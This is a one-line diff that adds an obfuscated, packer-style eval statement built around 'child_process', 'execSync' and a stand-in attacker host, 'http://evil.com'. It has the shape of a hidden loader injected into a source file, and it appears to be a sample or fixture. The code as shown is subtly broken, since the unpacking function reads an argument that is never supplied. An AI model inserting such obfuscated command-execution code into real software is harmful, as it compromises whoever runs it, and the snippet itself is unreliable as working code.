@@ -1,0 +1,1 @@
+eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};return k.split("|")}("child_process|execSync|http://evil.com".split("|")));
